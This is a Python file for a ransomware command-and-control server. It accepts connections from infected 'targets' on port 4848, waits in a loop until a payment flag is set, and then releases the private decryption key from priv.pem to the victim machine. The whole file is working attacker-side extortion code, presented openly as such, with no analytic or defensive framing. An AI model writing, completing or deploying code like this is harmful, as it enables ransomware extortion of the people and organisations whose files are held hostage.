import socket
import threading
import globals
import time

class Server:
    def __init__(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.addr = "0.0.0.0"
        self.port = 4848
        self.running = False
    
    def start(self):
        self.sock.bind((self.addr, self.port))
        self.sock.listen(5)
        self.running = True

        print("Succesfully Started C2 Server\nWaiting for connections...")

    def run(self):
        while self.running:
            conn, addr = self.sock.accept()
            print("Target Connected From ", addr)
            t = threading.Thread(target=self.handle_client, args=(conn, addr,))
            t.start()

    def handle_client(self, conn: socket.socket, addr):
        try:
            data = conn.recv(2048)
            print("Target connected:", data.decode(), addr[0])
            
            # Poll until payment is received
            while not globals.get_payment():
                time.sleep(2)  # check every 2 seconds, don't hammer the CPU
            
            # Payment confirmed, send the key
            self.send_key(conn)
            
        except Exception as e:
            print("Something went wrong", e)
        finally:
            conn.close()
            print("Connection closed:", addr[0])

    def check_payment(self, conn):
        if globals.get_payment():
            self.send_key(conn)

    def send_key(self, conn):  # needs conn param
        with open("priv.pem", "r") as f:
            key = f.read()
        conn.send(key.encode())
        print("Sent private key")